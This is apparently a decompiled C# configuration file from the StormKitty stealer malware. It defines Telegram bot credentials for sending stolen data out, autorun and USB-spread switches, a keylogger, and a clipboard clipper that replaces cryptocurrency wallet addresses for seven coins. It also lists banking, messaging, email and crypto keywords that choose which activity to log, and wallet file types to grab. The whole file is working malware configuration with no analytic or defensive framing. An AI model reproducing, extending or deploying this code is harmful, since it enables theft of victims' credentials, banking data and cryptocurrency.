﻿using System;
using System.Collections.Generic;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x02000056 RID: 86
	internal sealed class Config
	{
		// Token: 0x06000138 RID: 312 RVA: 0x00009310 File Offset: 0x00007510
		public static void Init()
		{
			Config.TelegramAPI = StringsCrypt.DecryptConfig(Config.TelegramAPI);
			Config.TelegramID = StringsCrypt.DecryptConfig(Config.TelegramID);
			if (Config.ClipperModule == "1")
			{
				Config.ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["btc"]);
				Config.ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["eth"]);
				Config.ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xmr"]);
				Config.ClipperAddresses["xlm"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xlm"]);
				Config.ClipperAddresses["xrp"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xrp"]);
				Config.ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["ltc"]);
				Config.ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["bch"]);
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00009444 File Offset: 0x00007644
		// Note: this type is marked as 'beforefieldinit'.
		static Config()
		{
			Dictionary<string, string[]> dictionary = new Dictionary<string, string[]>();
			dictionary["Document"] = new string[0];
			dictionary["DataBase"] = new string[]
			{
				"dat",
				"wallet"
			};
			dictionary["SourceCode"] = new string[0];
			dictionary["Image"] = new string[0];
			Config.GrabberFileTypes = dictionary;
		}

		// Token: 0x040000C1 RID: 193
		public static string TelegramAPI = "";

		// Token: 0x040000C2 RID: 194
		public static string TelegramID = "";

		// Token: 0x040000C3 RID: 195
		public static string Mutex = "YIVWWG5VTRE6P5VEJHLF";

		// Token: 0x040000C4 RID: 196
		public static string AntiAnalysis = "0";

		// Token: 0x040000C5 RID: 197
		public static string Autorun = "1";

		// Token: 0x040000C6 RID: 198
		public static string StartDelay = "1";

		// Token: 0x040000C7 RID: 199
		public static string Sleeptime = "0";

		// Token: 0x040000C8 RID: 200
		public static string usbspread = "--- USB ---";

		// Token: 0x040000C9 RID: 201
		public static string WebcamScreenshot = "0";

		// Token: 0x040000CA RID: 202
		public static string KeyloggerModule = "0";

		// Token: 0x040000CB RID: 203
		public static string ClipperModule = "1";

		// Token: 0x040000CC RID: 204
		public static int OppToMissDef = 2;

		// Token: 0x040000CD RID: 205
		public static string[] walletsbtc = new string[]
		{
			""
		};

		// Token: 0x040000CE RID: 206
		public static string[] walletseth = new string[]
		{
			""
		};

		// Token: 0x040000CF RID: 207
		public static string[] walletsltc = new string[]
		{
			""
		};

		// Token: 0x040000D0 RID: 208
		public static string[] walletsxmr = new string[]
		{
			""
		};

		// Token: 0x040000D1 RID: 209
		public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
		{
			{
				"btc",
				""
			},
			{
				"eth",
				""
			},
			{
				"xmr",
				""
			},
			{
				"xlm",
				"--- ClipperXLM ---"
			},
			{
				"xrp",
				""
			},
			{
				"ltc",
				""
			},
			{
				"bch",
				""
			}
		};

		// Token: 0x040000D2 RID: 210
		public static string[] KeyloggerServices = new string[]
		{
			"facebook",
			"twitter",
			"chat",
			"telegram",
			"skype",
			"discord",
			"viber",
			"message",
			"gmail",
			"protonmail",
			"outlook",
			"password",
			"encryption",
			"account",
			"login",
			"key",
			"sign in",
			"пароль",
			"bank",
			"банк",
			"credit",
			"card",
			"кредит",
			"shop",
			"buy",
			"sell",
			"купить"
		};

		// Token: 0x040000D3 RID: 211
		public static string[] BankingServices = new string[]
		{
			"qiwi",
			"money",
			"exchange",
			"citi",
			"bank",
			"credit",
			"card",
			"банк",
			"кредит",
			"bankofamerica",
			"wellsfargo",
			"chase"
		};

		// Token: 0x040000D4 RID: 212
		public static string[] CryptoServices = new string[]
		{
			"bitcoin",
			"monero",
			"dashcoin",
			"litecoin",
			"etherium",
			"stellarcoin",
			"btc",
			"eth",
			"xmr",
			"xlm",
			"xrp",
			"ltc",
			"bch",
			"blockchain",
			"paxful",
			"investopedia",
			"buybitcoinworldwide",
			"cryptocurrency",
			"crypto",
			"trade",
			"trading",
			"биткоин",
			"wallet"
		};

		// Token: 0x040000D5 RID: 213
		public static string[] PornServices = new string[]
		{
			"porn",
			"sex",
			"hentai",
			"порно",
			"sex"
		};

		// Token: 0x040000D6 RID: 214
		public static int GrabberSizeLimit = 5120;

		// Token: 0x040000D7 RID: 215
		public static Dictionary<string, string[]> GrabberFileTypes;
	}
}
